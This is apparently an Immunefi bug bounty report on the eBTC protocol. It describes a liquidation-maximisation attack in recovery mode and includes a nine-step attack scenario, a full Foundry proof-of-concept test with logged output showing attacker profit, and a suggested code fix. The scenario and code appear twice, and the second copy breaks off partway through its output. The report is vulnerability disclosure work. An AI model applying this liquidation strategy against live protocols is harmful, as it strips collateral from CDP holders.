# 28916 - \[SC - Insight] Liquidation Abuse More than half of all assets ...

Submitted on Mar 1st 2024 at 19:48:51 UTC by @cryptoticky for [Boost | eBTC](https://immunefi.com/bounty/ebtc-boost/)

Report ID: #28916

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/LiquidationLibrary.sol>

Impacts:

* Direct theft of 2 stETH worth of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

Liquidation Abuse: More than half of all assets can be liquidated in recovery mode.

## Brief/Intro

At the end of the grace period in recovery mode, the liquidator can maximize profits and cause enormous losses to the protocol.

## Vulnerability Details

![img\_1.png](https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/BadgerDAO%20\(eBTC\)/img_1.png)

The vulnerability is that in recovery mode, the liquidator can arbitrarily liquidate ICRs equal to or smaller than TCR.

When CDP with ICR smaller than TCR is liquidated, TCR rises.

In addition, TCR does not change when CDP with ICR such as TCR is completely liquidated.

In other words, the CDP with ICR close to TCR is liquidated, the slower the TCR rises, and if the system's recovery speed is very slow, the liquidated assets are eventually maximized.

Conversely, the smaller ICR is than TCR, the faster the system can enter the recovery phase, and the amount of liquidation is minimized.

These maximization and minimization principles have a significant impact on the amount of total assets held at the same time as the system transitions to normal mode, and the wave of total assets determines the system's stability (intensity) for future market fluctuations.

`The distribution of collateral amount according to ICR is similar to one normal distribution chart in which the amount decreases as the distance to TCR is centered on the TCR. Of course, the real graph will draw a curve in which the right and left are not symmetrical to each other around TCR and the right is slower than the left. What is important is that assets are concentrated and distributed around TCRs.`

This means that the maximization of liquidation leads to the rapid liquidation of the system's main assets, and in the worst-case scenario, more than half of the total collateral can be eliminated in a tx.

In particular, when TCR reaches MCR, this maximization reaches its peak, and the attacker can liquidate all CDPs between MCR and CCR. In the end, liquidation in recovery mode will deal a significant blow to the protocol and later bring about protocol bankruptcy, contrary to the initial purpose of maintaining the normal operation of the system by allowing liquidation in recovery mode to be allowed to recover quickly and improve the market situation.

Additionally, attempts to maximize liquidation lead to liquidation from a higher ICR to a lower one. This goes against the general principle that CDPs with higher ICRs should be relatively safer than CDPs with lower ICRs, which leads to the destruction of community.

### Scenario for Liquidation Maximization Attack

Now the system is in recoveryMode and grace period is finished.

1. The attacker searches CDPs (ICR = TCR).
2. The attacker liquidates the CDPs (ICR = TCR). => oldTCR = newTCR.
3. The attacker searches the largest CDP (ICR < TCR)
4. The attacker searches the smallest CDP (TCR < ICR < CCR). And then the attacker calculates the debtAmount to make TCR to ICR of the found CDP.
5. The attacker liquidates the largest CDP (ICR < TCR) partially or fully until TCR reaches the desired ICR value.
6. If the liquidation of one CDP does not produce the desired TCR value, continue with the step 5.
7. Steps 1 through 6 are repeated until there is no CDP with an ICR greater than the TCR and less than the MCR.
8. Proceed to step 1 \~ step 6 until TCR reaches CCR - 1. Repeated steps 1, 2, 3, and 4 are due to the fact that partial liquidation of the CDP results in changes in ICR, so that the CDP may be larger than TCR and smaller than CCR.
9. Completely liquidate the CDP, which has the largest collateral amount among CDPs with ICRs smaller than TCRs.

As a result of this attack, all CDPs between the initial TCR and CCR are liquidated, and some CDPs with ICRs smaller than TCR are also completely and partially liquidated.

Let's look at this scenario through real code.

You can create PoC\_CdpManagerLiquidationRecoveryTest.t.sol file in foundry\_test folder.

And run this in terminal.

`forge test -vvv --match-contract PoC_CdpManagerLiquidationRecoveryTest`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Dependencies/EbtcMath.sol";
import {eBTCBaseInvariants} from "./BaseInvariants.sol";

contract PoC_CdpManagerLiquidationRecoveryTest is eBTCBaseInvariants {
    bytes32[5] cdpIds;
    address user;
    uint256 eBTCBalance;
    uint256 stETHBalance;


    function setUp() public override {
        super.setUp();
        connectCoreContracts();
        connectLQTYContractsToCore();
        vm.warp(3 weeks);

        console.log("\n");

        console.log("========= Configration ==========");
        user = _utils.getNextUserAddress();

        // --- open cdps ---
        uint256 minColl = cdpManager.MIN_NET_STETH_BALANCE();

        (, cdpIds[0]) = _singleCdpSetupWithICR(user, 1320e15, minColl * 5); // ICR = 132% => ICR = 110%
        (, cdpIds[1]) = _singleCdpSetupWithICR(user, 1464e15, minColl * 5); // ICR = 146.4% => ICR = 122%
        (, cdpIds[2]) = _singleCdpSetupWithICR(user, 1476e15, minColl * 5); // ICR = 147.6% => ICR = 123%
        (, cdpIds[3]) = _singleCdpSetupWithICR(user, 1488e15, minColl * 5); // ICR = 148.8% => ICR = 124%
        (, cdpIds[4]) = _singleCdpSetupWithICR(user, 1596e15, minColl * 5); // ICR = 151.2% => ICR = 133%

        console.log("------- Update Price -------");
        uint256 price = priceFeedMock.fetchPrice() * 10 / 12;
        priceFeedMock.setPrice(price);
        console.log("CDP_110ICR = ", cdpManager.getSyncedICR(cdpIds[0], price));
        console.log("CDP_122ICR = ", cdpManager.getSyncedICR(cdpIds[1], price));
        console.log("CDP_123ICR = ", cdpManager.getSyncedICR(cdpIds[2], price));
        console.log("CDP_124ICR = ", cdpManager.getSyncedICR(cdpIds[3], price));
        console.log("CDP_133ICR = ", cdpManager.getSyncedICR(cdpIds[4], price));

        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("TCR: ", TCR);
        console.log("\n");
        console.log("--- wait until RMCollDown ---");
        _waitUntilRMColldown();

        stETHBalance = collateral.balanceOf(user);
        eBTCBalance = eBTCToken.balanceOf(user);
    }

    function test_PoC1LiquidationWithMinimalAmountInRecoveryMode() public {
        uint256 price = priceFeedMock.fetchPrice();
        bool isAvailableToLiq = _checkAvailableToLiq(cdpIds[0], price);
        console.log("Is available to liquidate? ", isAvailableToLiq);
        if (isAvailableToLiq) {
            console.log("- Liquidate CDP_110ICR fully");
            vm.prank(user);
            cdpManager.liquidate(cdpIds[0]);

            uint256 TCR = cdpManager.getCachedTCR(price);

            console.log("TCR: ", TCR);
            console.log("!!!System is in NormalMode liquidating only the first CDP!!!");
        }

        console.log("\n");

        console.log("Is CDP_110ICR liquidated? ", !sortedCdps.contains(cdpIds[0]));
        console.log("Is CDP_122ICR liquidated? ", !sortedCdps.contains(cdpIds[1]));
        console.log("Is CDP_123ICR liquidated? ", !sortedCdps.contains(cdpIds[2]));
        console.log("Is CDP_124ICR liquidated? ", !sortedCdps.contains(cdpIds[3]));
        console.log("Is CDP_133ICR liquidated? ", !sortedCdps.contains(cdpIds[4]));

        console.log("CDP size: ", sortedCdps.getSize());

        uint256 _stETHBalance = collateral.balanceOf(user);
        uint256 _eBTCBalance = eBTCToken.balanceOf(user);
        uint256 userRevenue = _stETHBalance - stETHBalance - collateral.getSharesByPooledEth(((eBTCBalance - _eBTCBalance) * DECIMAL_PRECISION) / price);
        console.log("\n");
        console.log("Final user revenue(stETH in wei): ", userRevenue);
    }

    function test_PoC2LiquidationAttackInRecoveryMode() public {
        console.log("--- Attacker will liquidate all CDPs (TCR <= ICR < CCR) and some CDPs (ICR < TCR < CCR) ---");
        console.log("---------------------------- Start Attack ----------------------------");
        uint256 TCR;
        uint256 targetICR;
        uint256 icr0;
        uint256 deltaDebt;

        uint256 price = priceFeedMock.fetchPrice();
        bool isAvailableToLiq = _checkAvailableToLiq(cdpIds[1], price);
        console.log("Is available to liquidate CDP_122ICR? ", isAvailableToLiq);
        isAvailableToLiq = _checkAvailableToLiq(cdpIds[0], price);
        console.log("Is available to liquidate CDP_110ICR? ", isAvailableToLiq);
        if (isAvailableToLiq) {
            console.log("\n");
            console.log("- Liquidate CDP_110ICR partially: TCR -> 122%");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            targetICR = cdpManager.getSyncedICR(cdpIds[1], price);
            deltaDebt = _calcDebtForDesiredTCRWithLastCDP(targetICR, activePool.getSystemCollShares(), activePool.getSystemDebt(), price, icr0);
            console.log("deltaDebt: ", deltaDebt);
            vm.prank(user);
            cdpManager.partiallyLiquidate(cdpIds[0], deltaDebt, cdpIds[0], cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR: ", TCR);

            isAvailableToLiq = _checkAvailableToLiq(cdpIds[1], price);
            console.log("Is available to liquidate CDP_122ICR? ", isAvailableToLiq);

            if (isAvailableToLiq) {
                console.log("- Liquidate CDP_122ICR fully");
                vm.prank(user);
                cdpManager.liquidate(cdpIds[1]);

                TCR = cdpManager.getCachedTCR(price);
                console.log("TCR after LiqCDP_122ICR: ", TCR);
            }

            console.log("\n");
            console.log("- Liquidate CDP_110ICR partially: TCR -> 123%");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            targetICR = cdpManager.getSyncedICR(cdpIds[2], price);
            deltaDebt = _calcDebtForDesiredTCRWithLastCDP(targetICR, activePool.getSystemCollShares(), activePool.getSystemDebt(), price, icr0);
            console.log("deltaDebt: ", deltaDebt);
            vm.prank(user);
            cdpManager.partiallyLiquidate(cdpIds[0], deltaDebt, cdpIds[0], cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR: ", TCR);

            isAvailableToLiq = _checkAvailableToLiq(cdpIds[2], price);
            console.log("Is available to liquidate CDP_123ICR? ", isAvailableToLiq);

            if (isAvailableToLiq) {
                console.log("- Liquidate CDP_123ICR fully");
                vm.prank(user);
                cdpManager.liquidate(cdpIds[2]);

                TCR = cdpManager.getCachedTCR(price);
                console.log("TCR after LiqCDP_123ICR: ", TCR);
            }

            console.log("\n");
            console.log("- Liquidate CDP_110ICR partially: TCR -> 124%");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            targetICR = cdpManager.getSyncedICR(cdpIds[3], price);
            deltaDebt = _calcDebtForDesiredTCRWithLastCDP(targetICR, activePool.getSystemCollShares(), activePool.getSystemDebt(), price, icr0);
            console.log("deltaDebt: ", deltaDebt);
            vm.prank(user);
            cdpManager.partiallyLiquidate(cdpIds[0], deltaDebt, cdpIds[0], cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR: ", TCR);

            isAvailableToLiq = _checkAvailableToLiq(cdpIds[3], price);
            console.log("Is available to liquidate CDP_124ICR? ", isAvailableToLiq);

            if (isAvailableToLiq) {
                console.log("- Liquidate CDP_124ICR fully");
                vm.prank(user);
                cdpManager.liquidate(cdpIds[3]);

                TCR = cdpManager.getCachedTCR(price);
                console.log("TCR after LiqCDP_124ICR: ", TCR);

                console.log("There is no CDP (TCR <= ICR < CCR)");
            }

            console.log("-- Now the attacker will liquidate some CDPs (ICR <= TCR) < CCR to earn more money --");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            console.log("CDP_110ICR = ", icr0);
            console.log("- Liquidate CDP_110ICR fully");
            vm.prank(user);
            cdpManager.liquidate(cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR after LiqCDP_110ICR fully: ", TCR);
            console.log("!!!System is in NormalMode liquidating 4 CDPs including the first CDP!!!");

            console.log("\n");

            console.log("Is CDP_110ICR liquidated? ", !sortedCdps.contains(cdpIds[0]));
            console.log("Is CDP_122ICR liquidated? ", !sortedCdps.contains(cdpIds[1]));
            console.log("Is CDP_123ICR liquidated? ", !sortedCdps.contains(cdpIds[2]));
            console.log("Is CDP_124ICR liquidated? ", !sortedCdps.contains(cdpIds[3]));
            console.log("Is CDP_133ICR liquidated? ", !sortedCdps.contains(cdpIds[4]));

            console.log("CDP size: ", sortedCdps.getSize());

            uint256 _stETHBalance = collateral.balanceOf(user);
            uint256 _eBTCBalance = eBTCToken.balanceOf(user);
            uint256 userRevenue = _stETHBalance - stETHBalance - collateral.getSharesByPooledEth(((eBTCBalance - _eBTCBalance) * DECIMAL_PRECISION) / price);
            console.log("\n");
            console.log("Final user revenue(stETH in wei): ", userRevenue);
        }
    }

    function _calcDebtForDesiredTCRWithLastCDP(
        uint256 desiredTCR,
        uint256 systemColl,
        uint256 systemDebt,
        uint256 price,
        uint256 icr
    ) internal view returns (
        uint256 deltaDebt
    ) {
        uint256 shareICR = collateral.getSharesByPooledEth(icr);
        uint256 x;
        uint256 y;
        if (desiredTCR > shareICR) {
            y = desiredTCR * systemDebt - systemColl * price;
            x = desiredTCR - shareICR;
        } else if (desiredTCR == shareICR) {
            return 0;
        } else {
            y = systemColl * price - desiredTCR * systemDebt;
            x = shareICR - desiredTCR;
        }
        deltaDebt = y / x;
        if (y > deltaDebt * x) {
            deltaDebt = deltaDebt + 1;
        }
    }

    function _checkAvailableToLiq(bytes32 _cdpId, uint256 _price) internal view returns (bool) {
        uint256 _TCR = cdpManager.getCachedTCR(_price);
        uint256 _ICR = cdpManager.getCachedICR(_cdpId, _price);
        bool _recoveryMode = _TCR < cdpManager.CCR();
        return (_ICR < cdpManager.MCR() || (_recoveryMode && _ICR <= _TCR));
    }

    function _singleCdpSetupWithICR(address _usr, uint256 _icr, uint256 _coll) internal returns (address, bytes32) {
        uint256 _price = priceFeedMock.fetchPrice();
        uint256 _debt = (_coll * _price) / _icr;
        bytes32 _cdpId = _openTestCDP(_usr, _coll + cdpManager.LIQUIDATOR_REWARD(), _debt);
        uint256 _cdpICR = cdpManager.getCachedICR(_cdpId, _price);
        return (_usr, _cdpId);
    }
}
```

The result:

```
[PASS] test_PoC1LiquidationWithMinimalAmountInRecoveryMode() (gas: 436732)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  ------- Update Price -------
  CDP_110ICR =  1100000000000000000
  CDP_122ICR =  1220000000000000002
  CDP_123ICR =  1230000000000000000
  CDP_124ICR =  1240000000000000000
  CDP_133ICR =  1330000000000000000
  TCR:  1219481713292820526
  

  --- wait until RMCollDown ---
  Is available to liquidate?  true
  - Liquidate CDP_110ICR fully
  TCR:  1253520994210266527
  !!!System is in NormalMode liquidating only the first CDP!!!
  

  Is CDP_110ICR liquidated?  true
  Is CDP_122ICR liquidated?  false
  Is CDP_123ICR liquidated?  false
  Is CDP_124ICR liquidated?  false
  Is CDP_133ICR liquidated?  false
  CDP size:  4
  

  Final user revenue(stETH in wei):  1109090909090909091

[PASS] test_PoC2LiquidationAttackInRecoveryMode() (gas: 1169013)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  ------- Update Price -------
  CDP_110ICR =  1100000000000000000
  CDP_122ICR =  1220000000000000002
  CDP_123ICR =  1230000000000000000
  CDP_124ICR =  1240000000000000000
  CDP_133ICR =  1330000000000000000
  TCR:  1219481713292820526
  

  --- wait until RMCollDown ---
  --- Attacker will liquidate all CDPs (TCR <= ICR < CCR) and some CDPs (ICR < TCR < CCR) ---
  ---------------------------- Start Attack ----------------------------
  Is available to liquidate CDP_122ICR?  false
  Is available to liquidate CDP_110ICR?  true
  

  - Liquidate CDP_110ICR partially: TCR -> 122%
  deltaDebt:  10961605937691929
  TCR:  1220000000000000002
  Is available to liquidate CDP_122ICR?  true
  - Liquidate CDP_122ICR fully
  TCR after LiqCDP_122ICR:  1220000000000000002
  

  - Liquidate CDP_110ICR partially: TCR -> 123%
  deltaDebt:  155355752425506834
  TCR:  1230000000000000000
  Is available to liquidate CDP_123ICR?  true
  - Liquidate CDP_123ICR fully
  TCR after LiqCDP_123ICR:  1229999999999999999
  

  - Liquidate CDP_110ICR partially: TCR -> 124%
  deltaDebt:  97215499756125516
  TCR:  1240000000000000000
  Is available to liquidate CDP_124ICR?  true
  - Liquidate CDP_124ICR fully
  TCR after LiqCDP_124ICR:  1239999999999999999
  There is no CDP (TCR <= ICR < CCR)
  -- Now the attacker will liquidate some CDPs (ICR <= TCR) < CCR to earn more money --
  CDP_110ICR =  1100000000000000001
  - Liquidate CDP_110ICR fully
  TCR after LiqCDP_110ICR fully:  1330000000000000000
  !!!System is in NormalMode liquidating 4 CDPs including the first CDP!!!
  

  Is CDP_110ICR liquidated?  true
  Is CDP_122ICR liquidated?  true
  Is CDP_123ICR liquidated?  true
  Is CDP_124ICR liquidated?  true
  Is CDP_133ICR liquidated?  false
  CDP size:  1
  

  Final user revenue(stETH in wei):  4148222783222976688

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 25.64ms

```

As can be seen from the code execution results, with the liquidation of the first CDP, we can return the system to normal mode and keep the system's holdings as much as possible.

However, the attacker liquidated all four CDPs in a maximization manner and made a quadruple profit, resulting in System losing 80% of its original assets.

Of course, the attacker will have to pay a small fee in the process of obtaining and repay again for debtToken because he uses a pool of several protocols such as balancer FlashLoan and uniswap dex to borrow debtToken, but if he calculates it well, a considerable amount of collateral can be liquidated and he would get much revenue.

Attached is a graph for intuitive understanding. The collateral itself according to the actual ICR is close to a normal distribution, but not a complete normal distribution.

## Impact Details

As you can see, the attacker can maximize his or her profits by liquidating a significant number of CDPs through a maximization method rather than a minimization method. As a result, the protocol's holdings will be seriously affected, and more than half of the total holdings may be liquidated in the worst-case scenario, despite the fact that it can go to normal mode while minimizing the reduction of the protocol's holdings. This vicious cycle can deplete the protocol's assets, leading to the protocol's bankruptcy.

## References

To solve this vulnerability, we can simply check the TCR whenever the function proceeds with a CDP.

We can modify CdpManager.sol:393-395 lines like

```solidity
while (
    currentBorrower != address(0) && totals.remainingDebtToRedeem > 0 && getCachedTCR(totals.price) >= MCR
) {
```

## Proof of Concept

### Scenario for Liquidation Maximization Attack

Now the system is in recoveryMode and grace period is finished.

1. The attacker searches CDPs (ICR = TCR).
2. The attacker liquidates the CDPs (ICR = TCR). => oldTCR = newTCR.
3. The attacker searches the largest CDP (ICR < TCR)
4. The attacker searches the smallest CDP (TCR < ICR < CCR). And then the attacker calculates the debtAmount to make TCR to ICR of the found CDP.
5. The attacker liquidates the largest CDP (ICR < TCR) partially or fully until TCR reaches the desired ICR value.
6. If the liquidation of one CDP does not produce the desired TCR value, continue with the step 5.
7. Steps 1 through 6 are repeated until there is no CDP with an ICR greater than the TCR and less than the MCR.
8. Proceed to step 1 \~ step 6 until TCR reaches CCR - 1. Repeated steps 1, 2, 3, and 4 are due to the fact that partial liquidation of the CDP results in changes in ICR, so that the CDP may be larger than TCR and smaller than CCR.
9. Completely liquidate the CDP, which has the largest collateral amount among CDPs with ICRs smaller than TCRs.

As a result of this attack, all CDPs between the initial TCR and CCR are liquidated, and some CDPs with ICRs smaller than TCR are also completely and partially liquidated.

Let's look at this scenario through real code.

You can create PoC\_CdpManagerLiquidationRecoveryTest.t.sol file in foundry\_test folder.

And run this in terminal.

`forge test -vvv --match-contract PoC_CdpManagerLiquidationRecoveryTest`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Dependencies/EbtcMath.sol";
import {eBTCBaseInvariants} from "./BaseInvariants.sol";

contract PoC_CdpManagerLiquidationRecoveryTest is eBTCBaseInvariants {
    bytes32[5] cdpIds;
    address user;
    uint256 eBTCBalance;
    uint256 stETHBalance;


    function setUp() public override {
        super.setUp();
        connectCoreContracts();
        connectLQTYContractsToCore();
        vm.warp(3 weeks);

        console.log("\n");

        console.log("========= Configration ==========");
        user = _utils.getNextUserAddress();

        // --- open cdps ---
        uint256 minColl = cdpManager.MIN_NET_STETH_BALANCE();

        (, cdpIds[0]) = _singleCdpSetupWithICR(user, 1320e15, minColl * 5); // ICR = 132% => ICR = 110%
        (, cdpIds[1]) = _singleCdpSetupWithICR(user, 1464e15, minColl * 5); // ICR = 146.4% => ICR = 122%
        (, cdpIds[2]) = _singleCdpSetupWithICR(user, 1476e15, minColl * 5); // ICR = 147.6% => ICR = 123%
        (, cdpIds[3]) = _singleCdpSetupWithICR(user, 1488e15, minColl * 5); // ICR = 148.8% => ICR = 124%
        (, cdpIds[4]) = _singleCdpSetupWithICR(user, 1596e15, minColl * 5); // ICR = 151.2% => ICR = 133%

        console.log("------- Update Price -------");
        uint256 price = priceFeedMock.fetchPrice() * 10 / 12;
        priceFeedMock.setPrice(price);
        console.log("CDP_110ICR = ", cdpManager.getSyncedICR(cdpIds[0], price));
        console.log("CDP_122ICR = ", cdpManager.getSyncedICR(cdpIds[1], price));
        console.log("CDP_123ICR = ", cdpManager.getSyncedICR(cdpIds[2], price));
        console.log("CDP_124ICR = ", cdpManager.getSyncedICR(cdpIds[3], price));
        console.log("CDP_133ICR = ", cdpManager.getSyncedICR(cdpIds[4], price));

        uint256 TCR = cdpManager.getCachedTCR(price);

        console.log("TCR: ", TCR);
        console.log("\n");
        console.log("--- wait until RMCollDown ---");
        _waitUntilRMColldown();

        stETHBalance = collateral.balanceOf(user);
        eBTCBalance = eBTCToken.balanceOf(user);
    }

    function test_PoC1LiquidationWithMinimalAmountInRecoveryMode() public {
        uint256 price = priceFeedMock.fetchPrice();
        bool isAvailableToLiq = _checkAvailableToLiq(cdpIds[0], price);
        console.log("Is available to liquidate? ", isAvailableToLiq);
        if (isAvailableToLiq) {
            console.log("- Liquidate CDP_110ICR fully");
            vm.prank(user);
            cdpManager.liquidate(cdpIds[0]);

            uint256 TCR = cdpManager.getCachedTCR(price);

            console.log("TCR: ", TCR);
            console.log("!!!System is in NormalMode liquidating only the first CDP!!!");
        }

        console.log("\n");

        console.log("Is CDP_110ICR liquidated? ", !sortedCdps.contains(cdpIds[0]));
        console.log("Is CDP_122ICR liquidated? ", !sortedCdps.contains(cdpIds[1]));
        console.log("Is CDP_123ICR liquidated? ", !sortedCdps.contains(cdpIds[2]));
        console.log("Is CDP_124ICR liquidated? ", !sortedCdps.contains(cdpIds[3]));
        console.log("Is CDP_133ICR liquidated? ", !sortedCdps.contains(cdpIds[4]));

        console.log("CDP size: ", sortedCdps.getSize());

        uint256 _stETHBalance = collateral.balanceOf(user);
        uint256 _eBTCBalance = eBTCToken.balanceOf(user);
        uint256 userRevenue = _stETHBalance - stETHBalance - collateral.getSharesByPooledEth(((eBTCBalance - _eBTCBalance) * DECIMAL_PRECISION) / price);
        console.log("\n");
        console.log("Final user revenue(stETH in wei): ", userRevenue);
    }

    function test_PoC2LiquidationAttackInRecoveryMode() public {
        console.log("--- Attacker will liquidate all CDPs (TCR <= ICR < CCR) and some CDPs (ICR < TCR < CCR) ---");
        console.log("---------------------------- Start Attack ----------------------------");
        uint256 TCR;
        uint256 targetICR;
        uint256 icr0;
        uint256 deltaDebt;

        uint256 price = priceFeedMock.fetchPrice();
        bool isAvailableToLiq = _checkAvailableToLiq(cdpIds[1], price);
        console.log("Is available to liquidate CDP_122ICR? ", isAvailableToLiq);
        isAvailableToLiq = _checkAvailableToLiq(cdpIds[0], price);
        console.log("Is available to liquidate CDP_110ICR? ", isAvailableToLiq);
        if (isAvailableToLiq) {
            console.log("\n");
            console.log("- Liquidate CDP_110ICR partially: TCR -> 122%");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            targetICR = cdpManager.getSyncedICR(cdpIds[1], price);
            deltaDebt = _calcDebtForDesiredTCRWithLastCDP(targetICR, activePool.getSystemCollShares(), activePool.getSystemDebt(), price, icr0);
            console.log("deltaDebt: ", deltaDebt);
            vm.prank(user);
            cdpManager.partiallyLiquidate(cdpIds[0], deltaDebt, cdpIds[0], cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR: ", TCR);

            isAvailableToLiq = _checkAvailableToLiq(cdpIds[1], price);
            console.log("Is available to liquidate CDP_122ICR? ", isAvailableToLiq);

            if (isAvailableToLiq) {
                console.log("- Liquidate CDP_122ICR fully");
                vm.prank(user);
                cdpManager.liquidate(cdpIds[1]);

                TCR = cdpManager.getCachedTCR(price);
                console.log("TCR after LiqCDP_122ICR: ", TCR);
            }

            console.log("\n");
            console.log("- Liquidate CDP_110ICR partially: TCR -> 123%");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            targetICR = cdpManager.getSyncedICR(cdpIds[2], price);
            deltaDebt = _calcDebtForDesiredTCRWithLastCDP(targetICR, activePool.getSystemCollShares(), activePool.getSystemDebt(), price, icr0);
            console.log("deltaDebt: ", deltaDebt);
            vm.prank(user);
            cdpManager.partiallyLiquidate(cdpIds[0], deltaDebt, cdpIds[0], cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR: ", TCR);

            isAvailableToLiq = _checkAvailableToLiq(cdpIds[2], price);
            console.log("Is available to liquidate CDP_123ICR? ", isAvailableToLiq);

            if (isAvailableToLiq) {
                console.log("- Liquidate CDP_123ICR fully");
                vm.prank(user);
                cdpManager.liquidate(cdpIds[2]);

                TCR = cdpManager.getCachedTCR(price);
                console.log("TCR after LiqCDP_123ICR: ", TCR);
            }

            console.log("\n");
            console.log("- Liquidate CDP_110ICR partially: TCR -> 124%");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            targetICR = cdpManager.getSyncedICR(cdpIds[3], price);
            deltaDebt = _calcDebtForDesiredTCRWithLastCDP(targetICR, activePool.getSystemCollShares(), activePool.getSystemDebt(), price, icr0);
            console.log("deltaDebt: ", deltaDebt);
            vm.prank(user);
            cdpManager.partiallyLiquidate(cdpIds[0], deltaDebt, cdpIds[0], cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR: ", TCR);

            isAvailableToLiq = _checkAvailableToLiq(cdpIds[3], price);
            console.log("Is available to liquidate CDP_124ICR? ", isAvailableToLiq);

            if (isAvailableToLiq) {
                console.log("- Liquidate CDP_124ICR fully");
                vm.prank(user);
                cdpManager.liquidate(cdpIds[3]);

                TCR = cdpManager.getCachedTCR(price);
                console.log("TCR after LiqCDP_124ICR: ", TCR);

                console.log("There is no CDP (TCR <= ICR < CCR)");
            }

            console.log("-- Now the attacker will liquidate some CDPs (ICR <= TCR) < CCR to earn more money --");
            icr0 = cdpManager.getSyncedICR(cdpIds[0], price);
            console.log("CDP_110ICR = ", icr0);
            console.log("- Liquidate CDP_110ICR fully");
            vm.prank(user);
            cdpManager.liquidate(cdpIds[0]);

            TCR = cdpManager.getCachedTCR(price);
            console.log("TCR after LiqCDP_110ICR fully: ", TCR);
            console.log("!!!System is in NormalMode liquidating 4 CDPs including the first CDP!!!");

            console.log("\n");

            console.log("Is CDP_110ICR liquidated? ", !sortedCdps.contains(cdpIds[0]));
            console.log("Is CDP_122ICR liquidated? ", !sortedCdps.contains(cdpIds[1]));
            console.log("Is CDP_123ICR liquidated? ", !sortedCdps.contains(cdpIds[2]));
            console.log("Is CDP_124ICR liquidated? ", !sortedCdps.contains(cdpIds[3]));
            console.log("Is CDP_133ICR liquidated? ", !sortedCdps.contains(cdpIds[4]));

            console.log("CDP size: ", sortedCdps.getSize());

            uint256 _stETHBalance = collateral.balanceOf(user);
            uint256 _eBTCBalance = eBTCToken.balanceOf(user);
            uint256 userRevenue = _stETHBalance - stETHBalance - collateral.getSharesByPooledEth(((eBTCBalance - _eBTCBalance) * DECIMAL_PRECISION) / price);
            console.log("\n");
            console.log("Final user revenue(stETH in wei): ", userRevenue);
        }
    }

    function _calcDebtForDesiredTCRWithLastCDP(
        uint256 desiredTCR,
        uint256 systemColl,
        uint256 systemDebt,
        uint256 price,
        uint256 icr
    ) internal view returns (
        uint256 deltaDebt
    ) {
        uint256 shareICR = collateral.getSharesByPooledEth(icr);
        uint256 x;
        uint256 y;
        if (desiredTCR > shareICR) {
            y = desiredTCR * systemDebt - systemColl * price;
            x = desiredTCR - shareICR;
        } else if (desiredTCR == shareICR) {
            return 0;
        } else {
            y = systemColl * price - desiredTCR * systemDebt;
            x = shareICR - desiredTCR;
        }
        deltaDebt = y / x;
        if (y > deltaDebt * x) {
            deltaDebt = deltaDebt + 1;
        }
    }

    function _checkAvailableToLiq(bytes32 _cdpId, uint256 _price) internal view returns (bool) {
        uint256 _TCR = cdpManager.getCachedTCR(_price);
        uint256 _ICR = cdpManager.getCachedICR(_cdpId, _price);
        bool _recoveryMode = _TCR < cdpManager.CCR();
        return (_ICR < cdpManager.MCR() || (_recoveryMode && _ICR <= _TCR));
    }

    function _singleCdpSetupWithICR(address _usr, uint256 _icr, uint256 _coll) internal returns (address, bytes32) {
        uint256 _price = priceFeedMock.fetchPrice();
        uint256 _debt = (_coll * _price) / _icr;
        bytes32 _cdpId = _openTestCDP(_usr, _coll + cdpManager.LIQUIDATOR_REWARD(), _debt);
        uint256 _cdpICR = cdpManager.getCachedICR(_cdpId, _price);
        return (_usr, _cdpId);
    }
}
```

The result:

```
[PASS] test_PoC1LiquidationWithMinimalAmountInRecoveryMode() (gas: 436732)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  ------- Update Price -------
  CDP_110ICR =  1100000000000000000
  CDP_122ICR =  1220000000000000002
  CDP_123ICR =  1230000000000000000
  CDP_124ICR =  1240000000000000000
  CDP_133ICR =  1330000000000000000
  TCR:  1219481713292820526
  

  --- wait until RMCollDown ---
  Is available to liquidate?  true
  - Liquidate CDP_110ICR fully
  TCR:  1253520994210266527
  !!!System is in NormalMode liquidating only the first CDP!!!
  

  Is CDP_110ICR liquidated?  true
  Is CDP_122ICR liquidated?  false
  Is CDP_123ICR liquidated?  false
  Is CDP_124ICR liquidated?  false
  Is CDP_133ICR liquidated?  false
  CDP size:  4
  

  Final user revenue(stETH in wei):  1109090909090909091

[PASS] test_PoC2LiquidationAttackInRecoveryMode() (gas: 1169013)
Logs:
  block.timestamp 1
  

  ========= Configration ==========
  ------- Update Price -------
  CDP_110ICR =  1100000000000000000
  CDP_122ICR =  1220000000000000002
  CDP_123ICR =  1230000000000000000
  CDP_124ICR =  1240000000000000000
  CDP_133ICR =  1330000000000000000
  TCR:  1219481713292820526
  

  --- wait until RMCollDown ---
  --- Attacker will liquidate all CDPs (TCR <= ICR < CCR) and some CDPs (ICR < TCR < CCR) ---
  ---------------------------- Start Attack ----------------------------
  Is available to liquidate CDP_122ICR?  false
  Is available to liquidate CDP_110ICR?  true
  

  - Liquidate CDP_110ICR partially: TCR -> 122%
  deltaDebt:  10961605937691929
  TCR:  1220000000000000002
  Is available to liquidate CDP_122ICR?  true
